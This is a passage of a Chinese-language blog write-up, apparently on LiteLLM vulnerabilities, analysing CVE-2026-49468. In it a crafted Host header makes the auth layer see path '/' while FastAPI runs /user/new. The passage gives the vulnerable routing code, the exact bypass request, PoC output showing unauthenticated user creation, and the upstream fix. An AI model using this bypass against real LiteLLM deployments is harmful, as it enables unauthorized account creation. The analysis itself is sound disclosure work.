+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:14000/?x=1/user/new</span><br></pre></td></tr></table></figure>
+
+<p>按 URL 语法，? 后面的内容会被当成 query string，所以 URL 的 path 被解析成：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.url.path = /</span><br></pre></td></tr></table></figure>
+
+<p>本地 1.83.14 容器中观测到的字段：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host: 127.0.0.1:14000/?x=1</span><br><span class="line">scope.path: /user/new</span><br><span class="line">request.url: http://127.0.0.1:14000/?x=1/user/new</span><br><span class="line">request.url.path: /</span><br><span class="line">request.base_url: http://127.0.0.1:14000/?x=1/</span><br><span class="line">request.base_url.path: /</span><br></pre></td></tr></table></figure>
+
+<h4 id="LiteLLM-旧版路由计算问题"><a href="#LiteLLM-旧版路由计算问题" class="headerlink" title="LiteLLM 旧版路由计算问题"></a>LiteLLM 旧版路由计算问题</h4><p>受影响版本中的 get_request_route() 逻辑：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_request_route</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(request, <span class="string">&quot;base_url&quot;</span>) <span class="keyword">and</span> request.url.path.startswith(</span><br><span class="line">            request.base_url.path</span><br><span class="line">        ):</span><br><span class="line">            <span class="keyword">return</span> request.url.path[<span class="built_in">len</span>(request.base_url.path) - <span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> request.url.path</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> request.url.path</span><br></pre></td></tr></table></figure>
+
+<p>在畸形 Host 请求中：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">request.url.path = /</span><br><span class="line">request.base_url.path = /</span><br></pre></td></tr></table></figure>
+
+<p>所以 LiteLLM 得到的鉴权路由是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/</span><br></pre></td></tr></table></figure>
+
+<p>而 &#x2F; 在 LiteLLM 中属于 public route。</p>
+<h4 id="鉴权绕过链路"><a href="#鉴权绕过链路" class="headerlink" title="鉴权绕过链路"></a>鉴权绕过链路</h4><p>完整链路：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /user/new</span><br><span class="line">Host: 127.0.0.1:14000/?x=1</span><br><span class="line">无 Authorization</span><br><span class="line"></span><br><span class="line">-&gt; Starlette request.url = http://127.0.0.1:14000/?x=1/user/new</span><br><span class="line">-&gt; request.url.path = /</span><br><span class="line">-&gt; LiteLLM get_request_route() 返回 /</span><br><span class="line">-&gt; / 是 LiteLLM public route</span><br><span class="line">-&gt; user_api_key_auth 跳过 API key 鉴权</span><br><span class="line">-&gt; FastAPI 仍按 scope[&quot;path&quot;]=/user/new 分发到 /user/new handler</span><br><span class="line">-&gt; /user/new 被未授权执行</span><br></pre></td></tr></table></figure>
+
+<p>关键矛盾是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">鉴权层看到：/</span><br><span class="line">路由层执行：/user/new</span><br></pre></td></tr></table></figure>
+
+<h4 id="本地复现结果"><a href="#本地复现结果" class="headerlink" title="本地复现结果"></a>本地复现结果</h4><p>复现版本：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LiteLLM 1.83.14</span><br></pre></td></tr></table></figure>
+
+<p>PoC：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Users/albert/Downloads/AliRedTeam/0day/litellm-lab/pocs/poc_49468.py</span><br></pre></td></tr></table></figure>
+
+<p>正常 Host，无 Authorization：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /user/new</span><br><span class="line">Host: 127.0.0.1:14000</span><br><span class="line"></span><br><span class="line">结果：401</span><br><span class="line">Authentication Error, No api key passed in.</span><br></pre></td></tr></table></figure>
+
+<p>畸形 Host，无 Authorization：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /user/new</span><br><span class="line">Host: 127.0.0.1:14000/?x=1</span><br><span class="line"></span><br><span class="line">结果：200</span><br><span class="line">成功创建 internal_user</span><br></pre></td></tr></table></figure>
+
+<p>PoC 输出：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">baseline-no-auth-normal-host: 401</span><br><span class="line">crafted-host-attempt-1: 200</span><br><span class="line">bypass_host=&#x27;127.0.0.1:14000/?x=1&#x27;</span><br><span class="line">verdict=LIKELY VULNERABLE</span><br></pre></td></tr></table></figure>
+
+<p><strong>官方FIX</strong>：<a target="_blank" rel="noopener" href="https://github.com/BerriAI/litellm/commit/d35d2a70f4e5f69bcf44665b4c22b00e33fe3ad4#diff-5c7e2cf2b2f8f4d8b0f4e5b0d8b7e8d7b0e7d4e0a3f8a6c8f4d8a0e4b6e9c3d1">d35d2a7</a></p>
+<p><img src="/images/04/25.png" alt="image25"></p>
+<p>不使用会被 Host header 影响的 request.url.path 作为鉴权路径，改用 scope[“path”]，scope[“path”] 来自 HTTP request line，由 ASGI server 设置 Host header 无法把 scope[“path”] 从 &#x2F;user&#x2F;new 改成 &#x2F;</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/Z3r4y">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A7%88%E8%A1%A8"><span class="toc-number">1.</span> <span class="toc-text">概览表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-30623"><span class="toc-number">1.1.</span> <span class="toc-text">CVE-2026-30623</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-42203"><span class="toc-number">1.2.</span> <span class="toc-text">CVE-2026-42203</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-42208"><span class="toc-number">1.3.</span> <span class="toc-text">CVE-2026-42208</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-42271"><span class="toc-number">1.4.</span> <span class="toc-text">CVE-2026-42271</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-40217"><span class="toc-number">1.5.</span> <span class="toc-text">CVE-2026-40217</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-47102"><span class="toc-number">1.6.</span> <span class="toc-text">CVE-2026-47102</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-47101"><span class="toc-number">1.7.</span> <span class="toc-text">CVE-2026-47101</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-49468"><span class="toc-number">1.8.</span> <span class="toc-text">CVE-2026-49468</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA"><span class="toc-number">1.8.1.</span> <span class="toc-text">正常请求行为</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%95%B8%E5%BD%A2-Host-%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA"><span class="toc-number">1.8.2.</span> <span class="toc-text">畸形 Host 请求行为</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LiteLLM-%E6%97%A7%E7%89%88%E8%B7%AF%E7%94%B1%E8%AE%A1%E7%AE%97%E9%97%AE%E9%A2%98"><span class="toc-number">1.8.3.</span> <span class="toc-text">LiteLLM 旧版路由计算问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E9%93%BE%E8%B7%AF"><span class="toc-number">1.8.4.</span> <span class="toc-text">鉴权绕过链路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0%E7%BB%93%E6%9E%9C"><span class="toc-number">1.8.5.</span> <span class="toc-text">本地复现结果</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/06/21/Attack%20of%20LiteLLM/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/06/21/Attack%20of%20LiteLLM/&text=Attack of LiteLLM"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/06/21/Attack%20of%20LiteLLM/&title=Attack of LiteLLM"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/06/21/Attack%20of%20LiteLLM/&is_video=false&description=Attack of LiteLLM"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Attack of LiteLLM&body=Check out this article: http://example.com/2026/06/21/Attack%20of%20LiteLLM/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/06/21/Attack%20of%20LiteLLM/&title=Attack of LiteLLM"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/06/21/Attack%20of%20LiteLLM/&title=Attack of LiteLLM"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/06/21/Attack%20of%20LiteLLM/&title=Attack of LiteLLM"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/06/21/Attack%20of%20LiteLLM/&title=Attack of LiteLLM"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/06/21/Attack%20of%20LiteLLM/&name=Attack of LiteLLM&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/06/21/Attack%20of%20LiteLLM/&t=Attack of LiteLLM"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Z3r4y
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Z3r4y">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
